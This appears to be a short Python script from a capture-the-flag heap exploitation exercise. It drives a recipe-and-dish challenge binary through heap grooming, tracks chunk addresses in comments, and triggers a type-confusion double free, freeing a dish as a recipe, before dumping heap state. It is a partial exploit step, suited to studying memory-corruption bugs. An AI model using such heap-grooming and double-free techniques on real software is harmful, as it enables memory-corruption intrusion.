import sys,os; sys.path.insert(0,'/mnt/c/Users/ha/Downloads/pwn')
from dumper import G
g=G('god2')
g.add(b'UNIQ777', (b'0',))   # recipe UNIQ777 early (normal recipe, low addr)
# clean groom (dish separators)
g.add(b'A1'); g.add(b'B2'); g.cook(b'Beef noodles'); g.add(b'YY'); g.add(b'Z9'); g.cook(b'Beef noodles')
for t in (b'B2',b'Z9',b'A1',b'YY'): g.rm(t)
g.add(b'CC')                 # CC->next=&YY (0x120), remainder 0x90
g.cook(b'Beef noodles')      # D1 -> remainder
g.cook(b'Beef noodles')      # D2
g.cook(b'UNIQ777')           # D3 -> YY ; name "UNIQ777"
g.rm(b'UNIQ777')             # free RECIPE UNIQ777
g.rm(b'UNIQ777')             # type-confusion: free DISH as recipe
g.dump('free-dish-as-recipe v2')
g.close()
